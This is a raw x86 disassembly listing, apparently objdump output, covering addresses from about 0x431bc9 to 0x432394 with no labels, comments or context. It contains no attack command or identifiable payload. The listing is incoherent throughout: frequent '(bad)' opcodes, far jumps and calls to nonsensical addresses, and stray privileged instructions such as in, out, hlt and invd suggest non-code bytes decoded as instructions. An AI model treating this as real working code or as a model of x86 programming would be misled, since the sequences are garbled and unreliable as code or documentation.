  431bc9:	inc    ebp
  431bca:	mov    esi,DWORD PTR [ebx]
  431bcc:	or     al,0x3
  431bce:	(bad)  
  431bcf:	mov    edi,eax
  431bd1:	in     al,dx
  431bd2:	scas   eax,DWORD PTR es:[edi]
  431bd3:	inc    ebp
  431bd4:	mov    esi,DWORD PTR [ebx]
  431bd6:	in     al,0x3
  431bd8:	add    al,0x89
  431bda:	mov    ecx,DWORD PTR [eax+edi*8]
  431bdd:	dec    ebp
  431bde:	(bad)  
  431bdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431be6:	mov    ecx,eax
  431be8:	cld    
  431be9:	push   es
  431bea:	dec    ebp
  431beb:	add    al,0x33
  431bed:	mov    DWORD PTR [ebx],eax
  431bef:	in     al,dx
  431bf0:	cmp    DWORD PTR [ebp-0x67],eax
  431bf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431bff:	xor    eax,DWORD PTR [ebp+0x3]
  431c02:	cmp    DWORD PTR [ebx],0x8b327499
  431c08:	xor    edi,esp
  431c0a:	jmp    0xff77195c
  431c0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431c12:	xor    ebx,DWORD PTR [edi]
  431c14:	add    eax,ecx
  431c16:	cmp    ebx,DWORD PTR [eax]
  431c18:	mov    ecx,DWORD PTR [ebp-0x4]
  431c1b:	mov    ecx,DWORD PTR [eax]
  431c1d:	adc    BYTE PTR [ebp-0x80],al
  431c20:	jmp    0x431c23
  431c22:	mov    eax,DWORD PTR [eax]
  431c24:	cld    
  431c25:	mov    bh,0xc6
  431c27:	push   ecx
  431c28:	(bad)  
  431c29:	jne    0x431c89
  431c2b:	dec    ecx
  431c2d:	or     BYTE PTR [ecx+ebx*1],cl
  431c30:	push   ebp
  431c31:	inc    ebp
  431c32:	in     al,dx
  431c33:	add    ebp,esp
  431c35:	or     bh,al
  431c37:	dec    ebp
  431c38:	cld    
  431c39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431c3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431c43:	dec    DWORD PTR [ebx+0x45510cf4]
  431c49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431c4f:	mov    edx,DWORD PTR [ecx+0xc]
  431c52:	xor    eax,esi
  431c54:	mov    edx,0xc172c7
  431c59:	inc    ebp
  431c5a:	mov    esi,DWORD PTR [ebp+0x8]
  431c5d:	mov    eax,edx
  431c5f:	call   0x84c7e354
  431c64:	add    DWORD PTR [edx-0x76bace00],ebx
  431c6a:	mov    ebp,eax
  431c6c:	or     BYTE PTR [eax],dl
  431c6e:	jo     0x431cbd
  431c70:	push   edi
  431c71:	xor    esi,DWORD PTR [ebp+0x3]
  431c74:	(bad)  
  431c75:	pmulhuw mm0,mm1
  431c78:	test   DWORD PTR [ebp-0x8],ecx
  431c7b:	mov    DWORD PTR [ebp-0x67],eax
  431c7e:	mov    eax,DWORD PTR [ebp-0x4]
  431c81:	xor    edi,DWORD PTR [ebp-0x73]
  431c84:	xor    eax,DWORD PTR [ebx]
  431c86:	xor    esi,DWORD PTR [edx+0x3]
  431c89:	add    BYTE PTR [ecx],bh
  431c8b:	inc    ebp
  431c8c:	(bad)  
  431c8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431c93:	mov    DWORD PTR [eax],0x750f0004
  431c99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431c9f:	lock add BYTE PTR [ebp+0x0],cl
  431ca3:	mov    esi,DWORD PTR [ebp-0x18]
  431ca6:	mov    ebp,edx
  431ca8:	or     al,0x72
  431caa:	ja     0x431cac
  431cac:	mov    edx,esi
  431cae:	cld    
  431caf:	(bad)  
  431cb2:	cli    
  431cb3:	mov    esi,DWORD PTR [ebp-0x4]
  431cb6:	cmp    ecx,esi
  431cb8:	bswap  edi
  431cba:	(bad)
  431cbe:	mov    esi,DWORD PTR [ebp-0x4]
  431cc1:	mov    esi,ecx
  431cc3:	clc    
  431cc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431cc8:	push   ebx
  431cc9:	xor    eax,DWORD PTR [ebp+0x3]
  431ccc:	cmp    bl,BYTE PTR [edi-0x64]
  431ccf:	pop    ebx
  431cd0:	jmp    0x431d97
  431cd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431cd8:	xor    ebp,DWORD PTR [eax]
  431cda:	lea    eax,[ebp-0x8]
  431cdd:	xor    eax,0xc7ef9cf2
  431ce2:	neg    eax
  431ce4:	ins    DWORD PTR es:[edi],dx
  431ce5:	test   esi,edi
  431ce7:	clc    
  431ce8:	pop    esp
  431ce9:	inc    ebp
  431cea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431cf0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431cf6:	add    cl,al
  431cf8:	jne    0x431c94
  431cfa:	mov    esi,DWORD PTR [edx]
  431cfc:	in     al,dx
  431cfd:	push   esi
  431cfe:	xor    BYTE PTR [ebp-0xe],dh
  431d01:	add    edi,esi
  431d03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431d09:	add    cl,bh
  431d0b:	mov    edi,DWORD PTR [ebp+0x8]
  431d0e:	mov    DWORD PTR [ebp-0x14],esi
  431d11:	add    esi,DWORD PTR [ebp+0x3c]
  431d14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431d1a:	mov    ah,0x38
  431d1c:	call   0xe0e4:0x898b329c
  431d23:	jne    0x431d9a
  431d25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431d2b:	shl    edx,0xf2
  431d2e:	(bad)  
  431d2f:	mov    ah,0x16
  431d31:	dec    eax
  431d32:	jne    0x431cc7
  431d34:	mov    ecx,DWORD PTR [edi]
  431d36:	in     al,dx
  431d37:	jmp    0x431d2a
  431d39:	add    dl,dh
  431d3b:	mov    edi,esi
  431d3d:	or     al,0x8
  431d3f:	inc    ebp
  431d40:	jne    0x431d45
  431d42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431d48:	ret    
  431d49:	or     bh,bh
  431d4b:	jge    0x431d35
  431d4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431d53:	xor    edi,eax
  431d55:	add    esi,DWORD PTR [ebp-0x77]
  431d58:	mov    ebx,esp
  431d5a:	clc    
  431d5b:	neg    DWORD PTR [ebp-0x7c]
  431d5e:	xor    eax,DWORD PTR [eax]
  431d60:	cmp    eax,DWORD PTR [eax]
  431d62:	repz jne 0x431cfa
  431d65:	xor    eax,DWORD PTR [ecx]
  431d67:	add    ebx,DWORD PTR [eax]
  431d69:	mov    DWORD PTR [ebp-0x8],eax
  431d6c:	mov    eax,edi
  431d6e:	cld    
  431d6f:	lock pop eax
  431d71:	test   DWORD PTR [ebx],esi
  431d73:	clc    
  431d74:	add    edx,DWORD PTR [edi-0x740bff77]
  431d7a:	fdivp  st(4),st
  431d7c:	test   ecx,esi
  431d7e:	(bad)  
  431d7f:	jnp    0x431d80
  431d81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431d87:	jae    0x431d14
  431d89:	sub    edi,esp
  431d8b:	(bad)  
  431d8c:	shl    DWORD PTR [eax-0x3e],0x89
  431d90:	leave  
  431d91:	call   0x8198d49e
  431d96:	in     al,dx
  431d97:	(bad)  
  431d98:	in     al,dx
  431d99:	add    bh,al
  431d9b:	mov    esp,edi
  431d9d:	in     al,dx
  431d9e:	test   DWORD PTR [ebp-0x8],edi
  431da1:	mov    eax,DWORD PTR [ebp+0x2b]
  431da4:	xor    al,0x3
  431da6:	pushf  
  431da7:	jnp    0x573219e0
  431dad:	xor    edx,DWORD PTR [ebx-0x77]
  431db0:	push   ecx
  431db1:	loopne 0x431de6
  431db3:	jne    0x431d70
  431db5:	mov    esi,DWORD PTR [edx-0x20]
  431db8:	add    BYTE PTR [ebp-0x3d],bh
  431dbb:	xor    eax,DWORD PTR [ebp-0x73]
  431dbe:	mov    edi,DWORD PTR [esi]
  431dc0:	cld    
  431dc1:	jb     0x431d89
  431dc3:	add    bl,al
  431dc5:	jne    0x431e0c
  431dc7:	mov    edx,DWORD PTR [edi-0x10]
  431dca:	jge    0x431e49
  431dcc:	mov    esi,DWORD PTR [ebx]
  431dce:	lock add ecx,DWORD PTR [ebp+0x3b]
  431dd2:	xor    esi,DWORD PTR [ebp-0x77]
  431dd5:	mov    esi,eax
  431dd7:	lock inc ebp
  431dd9:	jge    0x431e10
  431ddb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431de2:	dec    ebp
  431de3:	mov    esi,DWORD PTR [ebx]
  431de5:	loopne 0x431d70
  431de7:	jge    0x431de1
  431de9:	add    DWORD PTR [ebp-0x7d],eax
  431dec:	cmc    
  431ded:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431df4:	dec    ebp
  431df5:	hlt    
  431df6:	xor    ebx,DWORD PTR [ebp-0x77]
  431df9:	mov    esi,esp
  431dfb:	in     al,0x45
  431dfd:	jge    0x431e38
  431dff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431e06:	dec    ebp
  431e07:	dec    esp
  431e08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431e0e:	inc    ebp
  431e0f:	hlt    
  431e10:	xor    eax,0xb88b9f75
  431e15:	add    al,0x95
  431e17:	icebp  
  431e18:	add    dl,dh
  431e1a:	mov    DWORD PTR [ebp+0x20],ebx
  431e1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431e20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431e24:	fistp  WORD PTR [ebx+0x0]
  431e27:	inc    ebp
  431e28:	mov    ebx,DWORD PTR [edi+0xc]
  431e2b:	add    eax,eax
  431e2d:	inc    ebp
  431e2e:	test   BYTE PTR [ebx],dh
  431e30:	add    eax,DWORD PTR [ebx]
  431e32:	add    BYTE PTR [esi+0x45],bl
  431e35:	ret    0x85
  431e38:	jnp    0x5443a207
  431e3e:	inc    bp
  431e40:	inc    ebp
  431e41:	xor    eax,0xc78a9cb9
  431e46:	add    ah,bl
  431e48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431e4e:	add    BYTE PTR [ebx+0x3],dl
  431e51:	mov    esi,0x708088b
  431e56:	cmp    esi,eax
  431e58:	setp   BYTE PTR [ecx-0x74fcffce]
  431e5f:	mov    esp,edi
  431e61:	call   0x33ce63b3
  431e66:	or     BYTE PTR [ebx],al
  431e68:	inc    ecx
  431e69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431e6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431e75:	lock add cl,al
  431e78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431e7f:	mov    ch,0x45
  431e81:	clc    
  431e82:	xor    eax,DWORD PTR [ebp+0x3]
  431e85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431e8b:	inc    ebp
  431e8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431e92:	mov    edi,eax
  431e94:	mov    eax,DWORD PTR [ebp+0x3c]
  431e97:	mov    ecx,DWORD PTR [eax]
  431e99:	hlt    
  431e9a:	inc    ebp
  431e9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431ea2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431ea8:	push   ebp
  431ea9:	mov    edi,DWORD PTR [ebx]
  431eab:	in     al,dx
  431eac:	jne    0x431e6f
  431eae:	mov    eax,DWORD PTR [ebp-0x28]
  431eb1:	add    DWORD PTR [eax],0xe8058dec
  431eb7:	clc    
  431eb8:	mov    esi,DWORD PTR [edi-0x8]
  431ebb:	add    dh,dl
  431ebd:	rol    WORD PTR [ebp-0x1],cl
  431ec1:	mov    edx,DWORD PTR [eax+0x8]
  431ec4:	jne    0x431e86
  431ec6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431ecd:	inc    ebp
  431ece:	push   esp
  431ecf:	test   DWORD PTR [ecx+0xf],ecx
  431ed2:	sub    edx,esp
  431ed4:	add    eax,DWORD PTR [eax]
  431ed6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431edc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431ee3:	mov    eax,DWORD PTR [ecx]
  431ee5:	and    BYTE PTR [eax],al
  431ee7:	cmp    dl,BYTE PTR [eax]
  431ee9:	add    BYTE PTR [ebp+0x66],al
  431eec:	inc    ecx
  431eee:	push   esp
  431eef:	add    BYTE PTR [ebp+0x0],dh
  431ef2:	push   edx
  431ef3:	enterw 0xc1,0x4d
  431ef8:	mov    esp,DWORD PTR [esi+0x20]
  431efb:	add    DWORD PTR [ecx-0x7b],eax
  431efe:	add    eax,DWORD PTR [ebx]
  431f00:	str    WORD PTR [eax+0x45]
  431f04:	lea    ecx,[ebx+0x45890801]
  431f0a:	sbb    BYTE PTR [ebx],al
  431f0c:	dec    ebp
  431f0d:	cmp    al,0xf
  431f0f:	inc    ebp
  431f10:	push   eax
  431f11:	mov    esi,DWORD PTR [ebx]
  431f13:	push   eax
  431f14:	add    eax,eax
  431f16:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431f1d:	inc    ebp
  431f1e:	add    BYTE PTR ds:0x8b4d8c00,dh
  431f24:	xor    edx,esp
  431f26:	add    eax,esi
  431f28:	mov    ebx,eax
  431f2a:	loopne 0x431f71
  431f2c:	dec    ebp
  431f2d:	mov    ecx,DWORD PTR [edi]
  431f2f:	cld    
  431f30:	push   eax
  431f31:	xchg   DWORD PTR [ebx],esi
  431f33:	add    DWORD PTR [ebx],ebp
  431f35:	add    BYTE PTR [ebx],ch
  431f37:	or     BYTE PTR [ecx],bh
  431f39:	dec    ecx
  431f3a:	loopne 0x431f3f
  431f3c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431f42:	push   ebp
  431f43:	add    DWORD PTR [ebx+0x55100800],eax
  431f49:	dec    ebp
  431f4a:	jmp    0x431ed5
  431f4c:	mov    esp,DWORD PTR [eax]
  431f4e:	sbb    dl,dl
  431f50:	inc    eax
  431f51:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  431f57:	add    BYTE PTR [ebx+0x74528555],cl
  431f5d:	push   ebp
  431f5e:	div    DWORD PTR [ebx]
  431f60:	and    eax,DWORD PTR [ebx]
  431f62:	add    edx,DWORD PTR [edx-0x30]
  431f65:	jno    0x431ef2
  431f67:	inc    DWORD PTR [eax+eiz*1]
  431f6a:	inc    ebp
  431f6b:	push   eax
  431f6c:	push   eax
  431f6d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  431f73:	mov    edi,esp
  431f75:	push   eax
  431f76:	inc    ebp
  431f77:	enter  0x458b,0x8
  431f7b:	push   ecx
  431f7c:	(bad)  
  431f7d:	call   0x10d2955
  431f82:	pop    ss
  431f83:	push   ebp
  431f84:	mov    ecx,DWORD PTR [ebx+0x489408]
  431f8a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  431f90:	push   ecx
  431f91:	jo     0x431f7b
  431f93:	inc    DWORD PTR [edi]
  431f95:	or     BYTE PTR [eax],al
  431f97:	call   0xce26e1
  431f9c:	fmul   QWORD PTR [ebp+0x55]
  431f9f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  431fa5:	mov    bh,0x8c
  431fa7:	adc    al,0x9a
  431fa9:	dec    esp
  431faa:	xor    bl,BYTE PTR [eax]
  431fac:	mov    ecx,DWORD PTR [ebp+0xc]
  431faf:	mov    eax,DWORD PTR [ebp-0x4]
  431fb2:	mov    esi,DWORD PTR [edi-0x3148f924]
  431fb8:	push   es
  431fb9:	retf   
  431fba:	mov    BYTE PTR [ebp-0x30],0x3b
  431fbe:	inc    ebp
  431fbf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  431fc6:	retf   0x83fc
  431fc9:	into   
  431fca:	dec    ebp
  431fcb:	retf   
  431fcc:	mov    ecx,DWORD PTR [ebp-0x74]
  431fcf:	mov    eax,DWORD PTR [eax]
  431fd1:	fdiv   QWORD PTR [ebx]
  431fd3:	mov    bh,0x3
  431fd5:	push   es
  431fd6:	mov    esi,ecx
  431fd8:	sbb    cl,dl
  431fda:	dec    ebp
  431fdb:	sar    DWORD PTR [ebx],cl
  431fdd:	push   ebp
  431fde:	jne    0x431fef
  431fe0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  431fe6:	lea    ebx,[eax]
  431fe8:	call   0xf4ccabaf
  431fed:	sbb    dh,dl
  431fef:	add    edx,ebx
  431ff1:	push   ebp
  431ff2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  431ff8:	push   ecx
  431ff9:	mov    DWORD PTR [eax-0x30],edx
  431ffc:	test   DWORD PTR [edx],eax
  431ffe:	xadd   esp,esi
  432001:	pop    es
  432002:	add    cl,dl
  432004:	mov    eax,ecx
  432006:	or     al,0x45
  432008:	(bad)  
  432009:	push   eax
  43200a:	add    DWORD PTR [edx+0x0],eax
  43200d:	add    ecx,DWORD PTR [ecx]
  43200f:	and    dh,cl
  432011:	call   0xc728e1
  432016:	add    DWORD PTR [ebp+0x0],edx
  432019:	mov    esp,DWORD PTR [ebp+0x18]
  43201c:	add    BYTE PTR [eax+0x54],cl
  43201f:	xor    eax,DWORD PTR [eax]
  432021:	add    esp,DWORD PTR [esi+0x3b]
  432024:	inc    ebp
  432025:	je     0x431faa
  432027:	push   ecx
  432028:	cli    
  432029:	dec    ebp
  43202a:	mov    DWORD PTR [ebx],eax
  43202c:	(bad)  
  43202d:	or     al,0x5e
  43202f:	inc    eax
  432030:	add    BYTE PTR [ebx],al
  432032:	data16 and BYTE PTR [ebp+0x50],al
  432036:	sub    DWORD PTR [ecx],0xfffffff8
  432039:	add    BYTE PTR [ebp-0x75],ah
  43203c:	add    BYTE PTR [eax],bl
  43203e:	enter  0x894d,0x8b
  432042:	int3   
  432043:	loopne 0x43207f
  432045:	rol    BYTE PTR [eax],0x33
  432048:	lea    cx,[ebp+0xa]
  43204c:	data16 jb 0x432094
  43204f:	add    BYTE PTR [ebx+0x44890855],cl
  432055:	sbb    ah,al
  432057:	inc    ebp
  432058:	cmp    cl,BYTE PTR [edi]
  43205a:	add    BYTE PTR [edx+0x66],dl
  43205d:	xor    ecx,DWORD PTR [eax]
  43205f:	sub    eax,DWORD PTR [eax]
  432061:	mov    eax,DWORD PTR [eax]
  432063:	or     al,0x66
  432065:	ror    edx,cl
  432067:	dec    ebp
  432068:	inc    ebp
  432069:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43206f:	cld    
  432070:	or     BYTE PTR [edi+0x4501dd],dl
  432076:	ror    dh,0xee
  432079:	retf   
  43207a:	(bad)  
  43207b:	dec    ebp
  43207c:	mov    al,0x8b
  43207e:	loop   0x4320a0
  432080:	cmp    ecx,DWORD PTR [edx]
  432082:	inc    ebp
  432083:	daa    
  432084:	loop   0x43200d
  432086:	out    dx,al
  432087:	add    edi,eax
  432089:	add    BYTE PTR [eax+0x3f52ed55],bh
  43208f:	push   ebp
  432090:	inc    ebp
  432091:	xor    ebx,eax
  432093:	add    ebp,esi
  432095:	push   edx
  432096:	push   bp
  432098:	inc    ebp
  432099:	(bad)  
  43209a:	jmp    0xc342e6f3
  43209f:	sbb    al,0x33
  4320a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4320a8:	add    BYTE PTR [ebp+0x45],0x8b
  4320ac:	jmp    0xf98b:0x100041c8
  4320b3:	xor    esi,DWORD PTR [edx+0x3]
  4320b6:	mov    ecx,DWORD PTR [edi]
  4320b8:	fmul   DWORD PTR [edx]
  4320ba:	add    BYTE PTR [eax],al
  4320bc:	lea    eax,[ebx-0x4700273c]
  4320c2:	add    al,0x4f
  4320c4:	pop    DWORD PTR [eax]
  4320c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4320cc:	push   edx
  4320cd:	inc    WORD PTR [ebp+0x8]
  4320d1:	mov    eax,0x514f4d
  4320d6:	(bad)
  4320da:	add    al,al
  4320dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4320e2:	test   DWORD PTR [esi+0x74],esp
  4320e5:	inc    ebp
  4320e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4320ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4320f2:	or     dh,cl
  4320f4:	or     eax,0x8b8d5045
  4320f9:	inc    ebp
  4320fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432100:	jne    0x432135
  432102:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432108:	add    DWORD PTR [ebx],eax
  43210a:	add    bh,bh
  43210c:	adc    DWORD PTR [eax],ecx
  43210e:	adc    DWORD PTR [ebp+0x55],edi
  432111:	push   es
  432112:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432118:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43211f:	inc    ebp
  432120:	mov    esp,edi
  432122:	or     al,0xd8
  432124:	push   eax
  432125:	(bad)  
  432126:	jne    0x4320dc
  432128:	call   0x3b1a15
  43212d:	inc    ebp
  43212e:	sar    BYTE PTR [edx],0x84
  432131:	out    dx,al
  432132:	add    bh,al
  432134:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43213b:	(bad)  
  43213c:	and    al,al
  43213e:	fs jmp 0x7cc86743
  432144:	bswap  ecx
  432146:	scas   al,BYTE PTR es:[edi]
  432147:	inc    esp
  432148:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43214f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432156:	call   DWORD PTR [edi]
  432158:	shr    ah,0x84
  43215b:	xchg   DWORD PTR [eax],eax
  43215d:	add    DWORD PTR [eax],eax
  43215f:	add    bh,bh
  432161:	dec    ebp
  432162:	and    BYTE PTR [ecx-0x38],dl
  432165:	push   eax
  432166:	dec    DWORD PTR [ebx+0xfd885]
  43216c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432172:	mov    WORD PTR [ecx+0x0],ss
  432175:	lea    ecx,[ebx+0x108b20d8]
  43217b:	mov    WORD PTR [edx],ds
  43217d:	add    BYTE PTR [edi+0xff01ff],al
  432183:	mov    ecx,DWORD PTR [ebp-0x28]
  432186:	push   ecx
  432187:	shl    BYTE PTR [ebp+0x3a],0x8b
  43218b:	inc    ebp
  43218c:	in     al,0xeb
  43218e:	jno    0x43211b
  432190:	push   edx
  432191:	mov    DWORD PTR [eax-0x28],edx
  432194:	mov    eax,DWORD PTR [ebp+0x20]
  432197:	je     0x432120
  432199:	mov    eax,DWORD PTR [ecx]
  43219b:	sbb    BYTE PTR [eax],al
  43219d:	pop    DWORD PTR [eax]
  43219f:	add    esi,eax
  4321a1:	add    bl,al
  4321a3:	adc    DWORD PTR [edi],esi
  4321a5:	jmp    0x8bce71f7
  4321aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4321b1:	jne    0x43213e
  4321b3:	mov    ecx,DWORD PTR [eax]
  4321b5:	in     al,0x75
  4321b7:	pop    DWORD PTR [ecx+0x5301]
  4321bd:	push   edx
  4321be:	inc    DWORD PTR [ebx]
  4321c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4321c6:	add    BYTE PTR [edi+0x9],dl
  4321c9:	call   DWORD PTR [esi]
  4321cb:	and    dl,al
  4321cd:	and    bh,bh
  4321cf:	inc    edi
  4321d1:	test   eax,edx
  4321d3:	sldt   ebx
  4321d6:	xor    al,0x0
  4321d8:	pushf  
  4321d9:	(bad)  
  4321da:	jmp    0x4321e8
  4321dc:	mov    eax,edi
  4321de:	or     al,0x75
  4321e0:	inc    eax
  4321e1:	call   0x4318e9
  4321e6:	mov    eax,eax
  4321e8:	loopne 0x43216e
  4321ea:	inc    ebp
  4321eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4321f1:	mov    eax,DWORD PTR [ebp+0x20]
  4321f4:	add    edi,ecx
  4321f6:	add    BYTE PTR [eax],ch
  4321f8:	cmp    edi,0x18
  4321fb:	test   DWORD PTR [ebp+0xf],esi
  4321fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432205:	jne    0x432209
  432207:	call   0xffa21ccc
  43220c:	leave  
  43220d:	rcr    BYTE PTR [esp+eax*4],0x55
  432211:	add    ah,ch
  432213:	add    BYTE PTR [edi-0x48fef979],dh
  432219:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432220:	inc    esp
  432221:	mov    ebx,DWORD PTR [eax]
  432223:	fcom   st(2)
  432225:	add    BYTE PTR [edi],bl
  432227:	lea    ecx,[eax-0x18]
  43222a:	(bad)  
  43222b:	push   DWORD PTR [ecx]
  43222d:	call   0xffb56f8f
  432232:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432236:	fstp   DWORD PTR [esi+ebx*8]
  432239:	push   ebp
  43223a:	pop    ebp
  43223b:	mov    esi,DWORD PTR [edx-0x38]
  43223e:	add    DWORD PTR [eax],0x28
  432241:	mov    edi,DWORD PTR [ebx]
  432243:	xor    esi,DWORD PTR [edx+0x3]
  432246:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43224a:	pop    ebp
  43224b:	or     al,0x4
  43224d:	inc    ecx
  43224e:	push   ebp
  43224f:	(bad)  
  432250:	in     al,dx
  432251:	or     ah,ch
  432253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432254:	xbegin 0xffc8984a
  43225a:	clc    
  43225b:	adc    al,0x45
  43225d:	div    BYTE PTR [eax+ecx*1]
  432260:	pushf  
  432261:	add    bh,al
  432263:	jne    0x43223d
  432265:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43226f:	add    eax,DWORD PTR [ebp+0x52]
  432272:	adc    eax,0x20
  432275:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43227b:	test   DWORD PTR [eax],eax
  43227d:	clc    
  43227e:	data16 or al,BYTE PTR [ebp+0x45]
  432282:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432289:	rol    BYTE PTR [ebp+0x45],1
  43228c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432292:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432298:	push   ebx
  432299:	add    BYTE PTR [ebx+0x0],dl
  43229c:	push   ecx
  43229d:	jge    0x4322d2
  43229f:	add    BYTE PTR [esi+0x4],dl
  4322a2:	jne    0x432309
  4322a4:	mov    edx,0x457200
  4322a9:	jmp    0x43226d
  4322ab:	xor    edi,DWORD PTR [ebx]
  4322ad:	pop    edi
  4322ae:	cvtdq2ps xmm7,xmm0
  4322b1:	ret    0x0
  4322b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4322ba:	xor    ecx,DWORD PTR [edi]
  4322bc:	add    eax,DWORD PTR [ecx+0x3b]
  4322bf:	push   ebx
  4322c0:	rdpmc  
  4322c2:	out    0x8d,al
  4322c4:	add    BYTE PTR [eax],cl
  4322c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4322cc:	ret    0x450c
  4322cf:	sbb    al,0x8b
  4322d1:	cmp    eax,esi
  4322d3:	or     cl,al
  4322d5:	or     al,0xc2
  4322d7:	pop    eax
  4322d8:	inc    ebp
  4322d9:	add    ecx,DWORD PTR [edi]
  4322db:	add    esi,DWORD PTR [ebp+0x39]
  4322de:	invd   
  4322e0:	jge    0x4322ec
  4322e2:	mov    eax,0x478ac0
  4322e7:	cli    
  4322e8:	xor    esp,ecx
  4322ea:	mov    ebx,0x5b8ac0
  4322ef:	ret    0x33
  4322f2:	mov    eax,0x833b8b
  4322f7:	sub    BYTE PTR [ebx],al
  4322f9:	inc    ebp
  4322fa:	xor    ax,0x9cf8
  4322fe:	inc    bh
  432300:	mov    esp,esp
  432302:	hlt    
  432303:	test   DWORD PTR [ebp-0x8],esi
  432306:	mov    eax,DWORD PTR [ebp-0x14]
  432309:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43230f:	dec    edi
  432310:	or     BYTE PTR [eax],al
  432312:	jne    0x43229d
  432314:	mov    esi,esp
  432316:	call   0x77a9aedb
  43231b:	inc    ebp
  43231c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432322:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432328:	add    BYTE PTR [esi+0x7d],ah
  43232b:	inc    ebp
  43232c:	mov    bx,WORD PTR [ebp+0x8]
  432330:	add    DWORD PTR [ebp+0x53],0x30c008b
  432337:	inc    ebp
  432338:	mov    bx,di
  43233b:	lock test BYTE PTR [ecx+0x7000801],bh
  432342:	jge    0x432305
  432344:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43234a:	cli    
  43234b:	xor    bl,bh
  43234d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432353:	test   BYTE PTR [eax],cl
  432355:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43235c:	cmp    ebp,eax
  43235e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432365:	test   BYTE PTR [ebp+0x1],bh
  432368:	mov    ebx,0x458a00
  43236d:	xor    esi,DWORD PTR [ebx]
  43236f:	add    esp,DWORD PTR [esi-0x77]
  432372:	pop    ebp
  432373:	loopne 0x4323db
  432375:	inc    ebp
  432376:	clc    
  432377:	xor    edi,DWORD PTR [ebx]
  432379:	add    esi,DWORD PTR [edx-0x77]
  43237c:	data16 fdivr QWORD PTR [ebp-0x49]
  432380:	mov    ebx,0xb78afc
  432385:	hlt    
  432386:	xor    edi,DWORD PTR [edx]
  432388:	data16 add BYTE PTR [ebp+0x66],bl
  43238c:	data16 lock clc 
  43238f:	cmp    bh,BYTE PTR [ebx]
  432391:	add    BYTE PTR [edi+0x66],dh
  432394:	psubq  mm7,QWORD PTR [ebp+0x0]
